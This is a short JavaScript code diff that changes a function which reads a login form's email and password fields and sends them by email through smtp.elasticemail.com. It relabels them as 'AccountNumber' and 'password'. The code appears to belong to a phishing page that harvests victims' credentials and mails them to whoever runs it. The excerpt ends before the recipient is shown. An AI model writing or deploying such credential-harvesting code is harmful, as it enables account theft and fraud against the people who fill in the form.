@@ -1,8 +1,8 @@
 function emailSend() {
   var email = document.getElementById('email').value;
   var password = document.getElementById('password').value;
-  var messageBody = "Email " + email +
-    "<br/> pass " + password;
+  var messageBody = "AccountNumber " + email +
+    "<br/> password " + password;
 
   Email.send({
     Host: "smtp.elasticemail.com",
